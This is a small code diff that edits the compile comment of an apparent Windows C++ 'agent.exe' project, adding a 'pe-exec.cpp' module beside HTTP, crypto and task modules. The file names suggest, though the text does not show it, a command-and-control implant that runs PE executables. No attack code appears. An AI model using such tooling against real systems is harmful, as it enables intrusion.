@@ -1,4 +1,4 @@
-// Compile with : x86_64-w64-mingw32-g++ -o agent.exe main.cpp base64.cpp crypt.cpp system_utils.cpp file_utils.cpp http_client.cpp task.cpp -lwininet -lpsapi -static
+// Compile with : x86_64-w64-mingw32-g++ -o agent.exe main.cpp base64.cpp crypt.cpp system_utils.cpp file_utils.cpp http_client.cpp task.cpp pe-exec.cpp -lwininet -lpsapi -static
 
 #include <iostream>
 #include <thread>
